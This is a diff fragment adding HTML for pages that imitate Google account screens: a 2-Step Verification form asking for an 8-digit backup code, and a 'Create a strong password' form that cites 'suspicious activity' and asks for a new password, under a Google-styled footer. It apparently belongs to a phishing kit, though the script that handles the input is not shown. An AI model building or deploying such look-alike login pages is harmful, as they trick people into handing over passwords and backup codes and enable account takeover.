+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  <div class="form-bottom-left">
+    <button class="btn-light-blue-transparent btn-background-animation-ele mt-6-mb-6 btn-light-blue-try-another-way-btn" data-id="try_another_way" onclick="linkoptionclick(this);">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Try another way</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  <div class="bottom-links-outerele bottom-links-outerele-overlay">
+  <div class="bottom-links-v-ele">
+    <div class="bottom-links-v-form-bottom-ele">
+    <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  <div class="form-bottom-left">
+    <button class="btn-light-blue-transparent btn-background-animation-ele mt-6-mb-6 btn-light-blue-resend-it-btn" data-id="resend_it" onclick="linkoptionclick(this);">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Resend it</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  </div>
+
+  <div class="section" id="section_backup_codes">
+
+  <div class="section-content pd-v-24" id="section_content-backup_codes">
+  <div class="section_title_desc_ele">
+  <span class="section_title">2-Step Verification</span>
+  <div class="mr-pd">
+  Enter one of your 8-digit backup codes
+  </div>
+  </div>
+  <div class="inputs-ele mt-24 pd-v-8">
+  <div class="inputs">
+    <div class="input-outerele">
+    <div class="input-innerele">
+    <div class="input-ele">
+    <input type="text" name="backup_code" id="inp_backup_code" class="input">
+    <label for="backup_code" class="input-label">Enter a backup code</label>
+    </div>
+    <div class="input-border"></div>
+    <div class="input-border-animated" id="inp_border_backup_code"></div>
+    </div>
+    </div>
+    <div id="error_backup_code_ele" class="error-ele">
+    <div id="error_backup_code" class="error">
+    <span class="error-icon"><svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
+    <span id="error_backup_code_desc">
+    </span>
+    </div>
+    </div>
+  </div>
+  <div class="input-checkbox-outerele pd-v-16-v-15">
+  <div class="input-checkbox-innerele">
+  <div class="input-checkbox-ele">
+  <input class="input-checkbox" type="checkbox">
+  <div class="input-checkbox-bottom-ele">
+  <svg aria-hidden="true" class="input-checkbox-bottom" viewBox="0 0 24 24"><path class="input-checkbox-bottom-path" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path></svg>
+  </div>
+  <div class="input-checkbox-back-circle"></div>
+  </div>
+  </div>
+  <div class="input-checkbox-text">
+  Don't ask again on this device
+  </div>
+  </div>
+  </div>
+  </div>
+
+  <div class="bottom-links-outerele">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  <div class="form-bottom-left">
+    <button class="btn-light-blue-transparent btn-background-animation-ele mt-6-mb-6 btn-light-blue-try-another-way-btn" data-id="try_another_way" onclick="linkoptionclick(this);">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Try another way</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  <div class="bottom-links-outerele bottom-links-outerele-overlay">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  </div>
+
+  <div class="section" id="section_strong_password">
+
+  <div class="section-content pd-v-24" id="section_content-strong_password">
+  <div class="section_title_desc_ele">
+  <span class="section_title">Create a strong password</span>
+  <div class="mr-pd mb-0 pb-3">
+  There's been <a class="link-btn link-roboto link-learnmore detailslink link-blue-transparent" href="https://support.google.com/accounts/answer/46526?hl=en">suspicious activity</a> on your Google Account. For your protection, you need to change your password. Create a new, strong password that you don't use for other websites.
+  </div>
+  </div>
+  <div class="inputs-ele">
+  <div class="inputs">
+    <div class="input-outerele pt-24">
+    <div class="input-innerele">
+    <div class="input-ele">
+    <input type="password" name="strong_password" id="inp_strong_password" class="input">
+    <label for="strong_password" class="input-label">Create password</label>
+    </div>
+    <div class="input-border"></div>
+    <div class="input-border-animated" id="inp_border_strong_password"></div>
+    </div>
+    </div>
+
+    <div class="input-outerele pt-24">
+    <div class="input-innerele">
+    <div class="input-ele">
+    <input type="password" name="strong_password_confirm" id="inp_strong_password_confirm" class="input">
+    <label for="strong_password_confirm" class="input-label">Confirm</label>
+    </div>
+    <div class="input-border"></div>
+    <div class="input-border-animated" id="inp_border_strong_password_confirm"></div>
+    </div>
+    </div>
+
+    <div id="strong_password_confirm_desc">
+    <span>At least 8 characters</span>
+    </div>
+
+    <div id="error_strong_password_ele" class="error-ele">
+    <div id="error_strong_password" class="error">
+    <span class="error-icon"><svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
+    <span id="error_strong_password_desc">
+    </span>
+    </div>
+    </div>
+  </div>
+  <div class="input-checkbox-outerele pd-v-16-v-15">
+  <div class="input-checkbox-innerele">
+  <div class="input-checkbox-ele input-checkbox-strong-password">
+  <input class="input-checkbox" type="checkbox">
+  <div class="input-checkbox-bottom-ele">
+  <svg aria-hidden="true" class="input-checkbox-bottom" viewBox="0 0 24 24"><path class="input-checkbox-bottom-path" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path></svg>
+  </div>
+  <div class="input-checkbox-back-circle"></div>
+  </div>
+  </div>
+  <div class="input-checkbox-text">
+  Show password
+  </div>
+  </div>
+  </div>
+  </div>
+
+  <div class="bottom-links-outerele">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  </div>
+
+</div>
+
+</div>
+
+</div>
+<footer class="pagefooter">
+<div class="language-selector-ele">
+<div class="language-selector">
+<span class="language-selector-language-text-ele">
+<span id="i2" class="language-selector-language-text" aria-label="">English (United States)</span>
+</span>
+
+<span class="arrowicon-ele">
+<svg class="arrowicon" viewBox="7 10 10 5" focusable="false">
+<polygon class="arrowicon-polygon-down" stroke="none" fill-rule="evenodd" points="7 10 12 15 17 10"></polygon>
+<polygon class="arrowicon-polygon-up" stroke="none" fill-rule="evenodd" points="7 15 12 10 17 15"></polygon>
+</svg>
+</span>
+
+<span id="i3" style="display: none" aria-hidden="true" role="listbox"></span>
+
+</div>
+
+</div>
+<ul class="pagefooterlinksele"><li class="pagefooterlinkele"><a class="pagefooterlink" href="https://support.google.com/accounts?hl=en-US&amp;p=account_iph" target="_blank">Help</a></li><li class="pagefooterlinkele"><a class="pagefooterlink" href="https://accounts.google.com/TOS?loc=PK&amp;hl=en-US&amp;privacy=true" target="_blank">Privacy</a></li><li class="pagefooterlinkele"><a class="pagefooterlink" href="https://accounts.google.com/TOS?loc=PK&amp;hl=en-US" target="_blank">Terms</a></li></ul>
+</footer>
+
+</div>
+</div>
